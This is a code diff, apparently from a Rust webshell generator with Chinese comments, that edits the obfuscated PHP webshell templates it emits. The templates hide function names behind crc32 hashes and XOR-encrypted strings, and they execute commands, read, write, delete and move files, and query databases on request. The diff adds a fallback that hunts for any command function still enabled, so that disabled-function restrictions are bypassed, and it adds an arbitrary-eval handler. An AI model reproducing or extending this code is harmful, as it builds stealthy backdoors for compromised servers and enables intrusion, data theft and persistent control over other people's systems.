@@ -216,6 +216,12 @@ foreach ($_fn as $_n) {{
     $_h = hash('crc32b', $_n);
     if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
 }}
+// 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
+// 按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
+// proc_open 需 3 参数不兼容单参数调用，排除）
+foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen') as $_c) {{
+    if (function_exists($_c)) {{ $_g[0] = $_c; break; }}
+}}
 "#
     );
     // XOR 字符串解密函数（仿样例：pack("H*") + 循环异或还原敏感字符串）
@@ -1063,6 +1069,12 @@ foreach ($_fn as $_n) {
     $_h = hash('crc32b', $_n);
     if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
 }
+// 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
+// 按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
+// proc_open 需 3 参数不兼容单参数调用，排除）
+foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen') as $_c) {
+    if (function_exists($_c)) { $_g[0] = $_c; break; }
+}
 
 function __PREFIX__dec($hex, $key) {
     $out = '';
@@ -1180,6 +1192,12 @@ $_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
 foreach ($_fn as $_n) {
     $_h = hash('crc32b', $_n);
     if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
+}
+// 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
+// 按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
+// proc_open 需 3 参数不兼容单参数调用，排除）
+foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen') as $_c) {
+    if (function_exists($_c)) { $_g[0] = $_c; break; }
 }
 
 function __PREFIX__dec($hex, $key) {
@@ -1518,6 +1536,10 @@ __SYMBOLS__);
 $_fn=get_defined_functions();
 $_fn=isset($_fn['int'.'ernal'])?$_fn['int'.'ernal']:array();
 foreach($_fn as $_n){$_h=hash('crc32b',$_n);if(isset($_t[$_h]))$_g[$_t[$_h]]=$_n;}
+/* 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
+   按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
+   proc_open 需 3 参数不兼容单参数调用，排除） */
+foreach(array('shell_exec','exec','system','passthru','popen') as $_c){if(function_exists($_c)){$_g[0]=$_c;break;}}
 
 /* 数据解包辅助 */
 function __DEC__($e,$k){$d=pack("H*",$e);return $d^str_pad('',strlen($d),$k);}
@@ -1527,7 +1549,7 @@ function __XOR__($d,$k){$o='';$n=strlen($d);for($i=0;$i<$n;$i++){$o.=$d[$i]^$k[$
 /* 数据加解密算法（自实现） */
 __ALGO__
 /* 业务处理函数 */
-function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o=@$_g[0]($c.' 2>&1');$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
+function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o='';if($_g[0]===''){$o='';}elseif($_g[0]==='exec'){@exec($c.' 2>&1',$__l);$o=implode("\n",$__l);}elseif($_g[0]==='system'||$_g[0]==='passthru'){ob_start();@$_g[0]($c.' 2>&1');$o=ob_get_clean();}elseif($_g[0]==='popen'){$__p=@popen($c.' 2>&1','r');$o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}else{$o=@$_g[0]($c.' 2>&1');}$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
 function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$isd=@$_g[6]($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>$isd?0:@$_g[7]($full),'mtime'=>@$_g[8]($full));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
 function __FETCH__($p){global $_g;$c=@$_g[3]($p);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
 function __STORE__($p,$d){global $_g;$v=@$_g[4]($p,@$_g[1]($d));if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
@@ -1535,6 +1557,7 @@ function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return
 function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
 function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
 function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR)));}
+function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@eval($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
 function __DBP__($c){
 $p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
 $driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:0;
@@ -1658,6 +1681,7 @@ if(isset($_POST['formData'])){
         $h=intval(substr(md5($m),0,8),16);
         $out='{"ok":false,"error":"unsupported"}';
         if($h==__H_PROBE__){$out=__ENV__();}
+        elseif($h==__H_EVAL__){$out=__EVALFN__(isset($req['c'])?(string)$req['c']:'');}
         elseif($h==__H_EXEC__){$out=__CMD__(isset($req['c'])?(string)$req['c']:'',isset($req['w'])?(string)$req['w']:'');}
         elseif($h==__H_LIST__){$out=__SCAN__(isset($req['p'])?(string)$req['p']:'.');}
         elseif($h==__H_READ__){$out=__FETCH__(isset($req['p'])?(string)$req['p']:'');}
@@ -1824,7 +1848,9 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("__ENV__", &format!("{prefix}env"))
                     .replace("__DBP__", &format!("{prefix}dbp"))
                     .replace("__DBQ__", &format!("{prefix}dbq"))
+                    .replace("__EVALFN__", &format!("{prefix}eval_fn"))
                     .replace("__H_PROBE__", &h("probe"))
+                    .replace("__H_EVAL__", &h("eval"))
                     .replace("__H_EXEC__", &h("exec"))
                     .replace("__H_LIST__", &h("list"))
                     .replace("__H_READ__", &h("read"))
